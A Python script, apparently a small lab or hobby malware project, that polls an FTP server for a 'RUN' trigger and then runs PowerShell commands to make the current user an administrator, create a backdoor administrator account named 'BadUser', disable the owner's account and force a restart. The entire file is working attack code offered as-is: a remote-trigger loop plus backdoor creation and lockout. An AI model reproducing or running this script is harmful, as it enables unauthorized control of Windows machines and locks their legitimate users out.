import getpass
import subprocess, sys
import ftplib
import time

# ftp Server 
host = "192.168.178.22"
username = "testuser"
password = "testuser"


def downloadFileFTPServer():
    # download File from FTP-Server
    ftp_server = ftplib.FTP(host, username, password)
    ftp_server.encoding = "utf-8"
    filename = "run.txt"
    with open(filename, "wb") as file:
        ftp_server.retrbinary(f"RETR {filename}", file.write)
    ftp_server.dir()
    file= open(filename, "r")
    text = file.read()
    ftp_server.quit()

    if text== "RUN":
        print("Attacke")
        time.sleep(3)
        start_attack()
    else:
        print("Waiting")
        time.sleep(10)


def start_attack():
    currentUser = getpass.getuser() # Get Current Username
    newUser = "BadUser"
    passwordNewUser = "test"

    # Make User Admin
    p = subprocess.Popen(["powershell.exe", f"Add-LocalGroupMember -Group \"Administratoren\" -Member {currentUser}"], stdout=sys.stdout)
    p.communicate()

    # New User
    p = subprocess.Popen(["powershell.exe", f"New-LocalUser -Name {newUser} -Description \"Description of this account\" -NoPassword"], stdout=sys.stdout)
    p.communicate()

    # Password for New User
    p = subprocess.Popen(["powershell.exe", f"net user {newUser} test"], stdout=sys.stdout)
    p.communicate()


    # Add-LocalGroupMember -Group "Administratoren" -Member User02
    # Make NewUser Admin
    p = subprocess.Popen(["powershell.exe", f"Add-LocalGroupMember -Group \"Administratoren\" -Member {newUser}"], stdout=sys.stdout)
    p.communicate()

    # lock Current Account
    p = subprocess.Popen(["powershell.exe", f"Disable-LocalUser -Name {currentUser}"], stdout=sys.stdout)
    p.communicate()

    # Force Shutdown computer 
    p = subprocess.Popen(["powershell.exe", f"Restart-Computer -Force"], stdout=sys.stdout)
    p.communicate()


while True:
    downloadFileFTPServer()
    